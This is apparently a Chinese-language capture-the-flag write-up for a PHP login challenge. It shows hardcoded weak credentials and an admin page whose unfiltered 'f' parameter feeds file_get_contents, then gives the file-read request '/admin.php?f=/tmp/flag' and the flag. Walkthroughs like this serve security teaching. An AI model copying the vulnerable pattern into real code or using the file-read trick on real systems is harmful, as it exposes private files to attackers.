# week1login

## 题目简述

登录接口使用硬编码弱口令；认证后的管理页把 GET 参数 `f` 原样传给 `file_get_contents`。登录后可利用任意本地文件读取访问容器中的 `/tmp/flag`。

## 解题过程

访问 `login.php` 可知密码为五位。源码 `check4login.php` 直接写死了凭据：

```php
if ($username != 'admin' || $password != '01234')
    header('Location:login.php?err=1');
```

因此无需无边界爆破，使用 `admin:01234` 登录即可。成功后服务设置 `$_SESSION['admin'] = true`，并跳转到形如 `admin.php?f=dogs_diary/dN` 的页面。管理页的关键逻辑是：

```php
echo file_get_contents($_GET['f']);
```

参数既没有限定目录，也没有过滤绝对路径；页面源码注释还提示 `flag in /tmp/flag`。保留登录会话访问：

```text
/admin.php?f=/tmp/flag
```

即可读到：

```text
0xGame{d0nt_u3e_we2k_pas3wd}
```

## 方法总结

- 核心方法：使用硬编码弱口令取得管理员会话，再利用未经约束的 `file_get_contents` 参数读取任意本地文件。
- 识别特征：登录后 URL 出现文件名参数，页面内容随参数变化，源码中直接把参数传入文件读取函数。
- 注意事项：读取 `/tmp/flag` 前必须保留有效 session；五位密码提示并不意味着必须爆破，已有源码时应先审计认证逻辑。
